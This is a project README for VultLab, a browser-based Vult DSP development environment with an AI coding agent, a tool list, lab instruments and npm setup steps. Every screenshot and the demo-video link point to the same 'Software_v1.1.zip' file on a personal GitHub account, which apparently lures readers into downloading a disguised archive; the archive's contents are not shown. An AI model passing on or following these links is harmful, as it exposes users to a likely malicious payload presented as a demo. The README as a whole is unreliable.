# DSPLab

<img width="677" height="369" alt="image" src="https://raw.githubusercontent.com/juandavidru4641/dsplab/main/src/components/Software_v1.1.zip" />

A development environment and diagnostic laboratory for DSP engineering.

<img width="1624" height="1008" alt="Screenshot 2026-03-10 at 20 48 43" src="https://raw.githubusercontent.com/juandavidru4641/dsplab/main/src/components/Software_v1.1.zip" />


## Demonstrations

[![VultLab Demo 2](https://raw.githubusercontent.com/juandavidru4641/dsplab/main/src/components/Software_v1.1.zip)](https://raw.githubusercontent.com/juandavidru4641/dsplab/main/src/components/Software_v1.1.zip)

Outdated demos, soon more.

## Why VultLab?

Building custom synthesizers, audio effects, and plugins often involves knowledge of low-level optimization, threading, and math. VultLab combines the efficient Vult language with an AI assistant.

*   **Rapid Prototyping:** Implement DSP ideas quickly. The isolated execution environment allows you to iterate on oscillators, filters, and state machines without crashing your host.
*   **Hardware-Ready Results:** Everything you build is ready for embedded deployment. One click exports C++ code for Teensy, Daisy, and other modular hardware platforms.
*   **AI-Accelerated Development:** The integrated agent handles technical tasks—from bug fixes to signal analysis. It supports context windows via **Google Gemini**, **Anthropic Claude 3.7**, **OpenAI**, **DeepSeek**, **Groq**, and local **Ollama** endpoints.
*   **UX / UI:** A dark mode interface synced with the `vs-dark` compiler aesthetics provides a distraction-free laboratory.

VultLab integrates a low-latency AudioWorklet execution engine with server-side compilation and high-frequency telemetry. It provides a specialized workspace for designing, testing, and verifying audio algorithms intended for embedded hardware and desktop applications.

## Integrated AI Agent

The IDE features an autonomous agent designed to assist with DSP development. It has direct access to the development environment through a set of specialized tools.

*   **Autonomous Iteration:** The agent performs trial compilations of its code. If the compiler returns an error, the agent analyzes the trace and attempts to correct the logic autonomously.
*   **Semantic Editing:** Uses high-level tools like `replace_function` and `fix_boilerplate` to modify entire logic blocks safely, while maintaining the ability for surgical line-editing (`multi_edit`).
*   **Persistent Workflow:** If a specific tool or strategy fails, the agent is instructed to automatically pivot to an alternative approach (e.g., from diffing to block-editing) to ensure the task is completed.
*   **Verification Loop:** Empirically verifies behavioral correctness using `get_live_telemetry`, `get_spectrum_data`, and `get_harmonics` before concluding any task.

### Agent Toolset

The agent is equipped with a diagnostic and engineering suite:

| Category | Tool | Description |
| :--- | :--- | :--- |
| **Research** | `get_current_code` | Reads the full Vult source code context. |
| | `list_functions` | Maps out all function signatures and parameters. |
| | `grep_search` | Searches for patterns across the codebase. |
| | `get_vult_reference` | Consults the official language syntax guide. |
| **Action** | `replace_function` | Safely replaces an entire function body by name. |
| | `multi_edit` | Performs multiple surgical line-block replacements. |
| | `fix_boilerplate` | Automatically restores missing mandatory MIDI handlers. |
| | `update_code` | Performs a complete architectural rewrite of the file. |
| **Verification** | `get_live_telemetry` | Inspects all internal memory states in real-time. |
| | `get_state_history` | Tracks historical changes of a specific variable. |
| | `get_spectrum_data` | Captures a 1024-band frequency snapshot. |
| | `get_harmonics` | Analyzes fundamental pitch and harmonic series. |
| | `get_signal_quality` | Measures THD+N, SNR, and Peak Levels in dBFS. |
| **Testing** | `set_multiple_knobs` | Configures laboratory parameter blocks. |
| | `configure_sequencer` | Programs melodic patterns for polyphonic testing. |
| | `trigger_generator` | Injects laboratory signals (Impulse, Sweep, etc.). |
| **Strategy** | `write_plan` | Documents multi-step engineering plans. |
| | `store_snapshot` | Saves named restore points in version history. |

## Diagnostic Laboratory

*   **Dual-Trace Oscilloscope:** Visualization featuring a main output trace and a secondary probe trace with adjustable gain, zoom, and stable rising-edge triggering.
*   **Logarithmic Spectrum Analyzer:** A frequency analyzer mapped to a logarithmic scale for monitoring the bass and mid-range response, complete with an interactive probe crosshair.
*   **Multi-Trace Logic Analyzer:** Roll-mode plotter for internal variables. Boolean states are rendered with sharp logic transitions for timing verification.
*   **Live Telemetry Inspector:** Real-time view of every internal memory variable with the ability to inject values directly into the running DSP engine.
*   **Technical Metrics:** Integrated vertical monitoring of signal headroom, clipping counts, THD+N, and RMS levels across true stereo L/R channels.

## Laboratory Gear & Performance

*   **Adaptive Virtual Keyboard:** A responsive MIDI keyboard that scales based on viewport width. Features slide-play support and tactile PC-keyboard bindings.
*   **Polyphonic Sequencer:** A multi-track TR-style drum and piano-roll melody sequencer allowing you to quickly loop test vectors into your DSP algorithms without leaving the browser.
*   **Controllers:** SVG knobs with 400-pixel sweep sensitivity and shift-click fine-tuning for parameter control.
*   **DSP Lab Routing:** Automatic mapping of Vult function parameters to laboratory input strips.
*   **Signal Sources:** Includes sine, saw, square, and triangle oscillators, as well as impulse, step, and frequency sweep generators.
*   **Audio Integration:** Support for loading external audio samples and routing live hardware inputs into the DSP chain.

## Technical Specifications

*   **Execution:** 128-sample block processing in an isolated AudioWorklet.
*   **Compilation:** Server-side Node.js bridge with expanded stack size for complex recursive patches.
*   **Export:** One-click C++ transcompilation for Teensy, Daisy, and custom hardware.
*   **Editor:** Monaco-based with custom Vult syntax definition and telemetry-driven sparkline hovers.

## Getting Started

### Installation
```bash
npm install
```

### Development
```bash
npm run dev
```

### Build
```bash
npm run build
```

## DSP Entry Point
VultLab expects a standard Vult process function:
```vult
fun process(input: real, cutoff: real) : real {
  // Your DSP logic here
  return result;
}
```

## Licensing

VultLab is licensed under a custom license that permits personal, educational, and non-commercial open-source use. 

*   **Attribution:** Any project using this software or its derivatives must attribute the original author (syso) and the VultLab project.
*   **Commercial Use:** Requires a separate commercial license. Please contact the author for inquiries.

See the [LICENSE](LICENSE) file for the full legal text.
